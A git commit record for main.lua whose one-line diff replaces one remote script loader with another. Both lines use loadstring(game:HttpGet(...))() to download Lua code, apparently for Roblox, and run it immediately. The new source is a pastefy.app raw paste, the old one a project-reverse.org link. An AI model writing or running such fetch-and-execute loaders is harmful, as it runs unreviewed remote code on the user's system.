4e9ed23b75d93982524cf36729df3525c28426bb
zcwi4crpz <innierdabodabo@gmail.com>
2026-06-17 16:16:57 +0800

    Update main.lua

--- main.lua
+++ main.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjllNWM2ODJlLWE1ZWQtNGNhNy04MzhkLTZhMGE0MThmYmNjZCIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJnYWcyX21haW5fdmlzdWFsIn19"))()
+loadstring(game:HttpGet("https://pastefy.app/iifEsfo0/raw"))()
